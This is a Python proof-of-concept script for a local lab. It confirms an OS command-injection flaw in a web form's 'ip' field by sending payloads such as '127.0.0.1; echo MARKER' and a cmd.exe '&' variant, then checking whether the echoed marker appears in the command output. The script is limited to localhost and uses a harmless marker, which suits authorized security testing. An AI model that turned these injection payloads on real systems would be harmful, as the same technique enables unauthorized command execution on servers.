#!/usr/bin/env python3
"""CMD-001 command-injection confirmation draft.

Local authorized lab only. Sends the audited parameters (Submit, ip) to the
deployed handler that includes the audited fragment and separates:
  * the <pre> command-output region parsed from the HTML response,
  * a reflection-only control payload (marker without shell metacharacters),
  * the marker echo produced only if the shell interprets the separator.
Standard library only (Python 3.8+).
"""

import argparse
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "CMD001_MARKER_7f3a"
ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Refuse redirects so an off-scope target is never followed."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect refused: " + str(newurl), headers, fp
        )


def make_opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), NoRedirect()
    )


def assert_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("unsupported URL scheme: %r" % (parts.scheme,))
    if (parts.hostname or "") not in ALLOWED_HOSTS:
        raise SystemExit("host not in local allowlist: %r" % (parts.hostname,))


def http_get(opener, url, cookie, timeout):
    req = urllib.request.Request(url, method="GET")
    if cookie:
        req.add_header("Cookie", cookie)
    with opener.open(req, timeout=timeout) as resp:
        return resp.getcode(), resp.read().decode("utf-8", "replace")


def http_post(opener, url, cookie, fields, timeout):
    body = urllib.parse.urlencode(fields).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if cookie:
        req.add_header("Cookie", cookie)
    with opener.open(req, timeout=timeout) as resp:
        return resp.getcode(), resp.read().decode("utf-8", "replace")


def fresh_token(opener, url, cookie, regex, timeout):
    _, html = http_get(opener, url, cookie, timeout)
    if not regex:
        return None
    match = re.search(regex, html, re.S)
    if not match:
        return None
    return match.group(1) if match.groups() else match.group(0)


def plain(text):
    text = re.sub(r"<br\s*/?>", "\n", text, flags=re.I)
    return re.sub(r"<[^>]*>", "", text)


def parse_result(html):
    blocks = [plain(b) for b in re.findall(r"<pre>(.*?)</pre>", html, re.S | re.I)]
    outside = re.sub(r"<pre>.*?</pre>", " ", html, flags=re.S | re.I)
    return {
        "pre_command_output": " | ".join(" ".join(b.split()) for b in blocks),
        "marker_standalone_line_in_pre": any(
            line.strip() == MARKER for block in blocks for line in block.splitlines()
        ),
        "marker_anywhere_in_pre": any(MARKER in block for block in blocks),
        "marker_outside_pre_reflection": MARKER in outside,
        "pre_region_found": bool(blocks),
    }


def main():
    parser = argparse.ArgumentParser(
        description="CMD-001 validation draft, local authorized lab only"
    )
    parser.add_argument(
        "--url",
        required=True,
        help="full URL of the deployed handler route that includes the audited "
        "fragment (the fragment itself names no path; supply it from the local deployment)",
    )
    parser.add_argument(
        "--cookie",
        default="",
        help="raw Cookie header value read from a local file; never commit or print it",
    )
    parser.add_argument("--submit-field", default="Submit")
    parser.add_argument("--submit-value", default="Submit")
    parser.add_argument("--ip-field", default="ip")
    parser.add_argument(
        "--token-field",
        default=None,
        help="set only if the deployed handler enforces a CSRF token on this form",
    )
    parser.add_argument("--token-regex", default=None)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--include-windows",
        action="store_true",
        help="also send the cmd.exe '&' variant",
    )
    args = parser.parse_args()

    assert_local(args.url)
    opener = make_opener()
    cases = [
        ("baseline", "127.0.0.1", "normal parameter only"),
        ("control_no_metachar", "127.0.0.1 " + MARKER, "marker without shell metacharacter"),
        ("test_posix", "127.0.0.1; echo " + MARKER, "POSIX shell separator ';'"),
    ]
    if args.include_windows:
        cases.append(
            ("test_cmd", "127.0.0.1 & echo " + MARKER, "cmd.exe separator '&'")
        )

    token_failures = 0
    for name, ip_value, note in cases:
        fields = {
            args.submit_field: args.submit_value,
            args.ip_field: ip_value,
        }
        if args.token_field:
            token = fresh_token(
                opener, args.url, args.cookie, args.token_regex, args.timeout
            )
            if not token:
                token_failures += 1
                print(
                    json.dumps(
                        {
                            "case": name,
                            "precondition_failed": "fresh token not found; not a filtering result",
                        },
                        ensure_ascii=False,
                    )
                )
                continue
            fields[args.token_field] = token
        try:
            status, html = http_post(
                opener, args.url, args.cookie, fields, args.timeout
            )
        except urllib.error.HTTPError as exc:
            print(
                json.dumps(
                    {"case": name, "http_error": exc.code, "payload": ip_value},
                    ensure_ascii=False,
                )
            )
            continue
        except urllib.error.URLError as exc:
            print(
                json.dumps(
                    {"case": name, "url_error": str(exc.reason), "payload": ip_value},
                    ensure_ascii=False,
                )
            )
            continue
        result = parse_result(html)
        result.update(
            {
                "case": name,
                "payload": ip_value,
                "http_status": status,
                "note": note,
            }
        )
        print(json.dumps(result, ensure_ascii=False, indent=2))

    if token_failures:
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
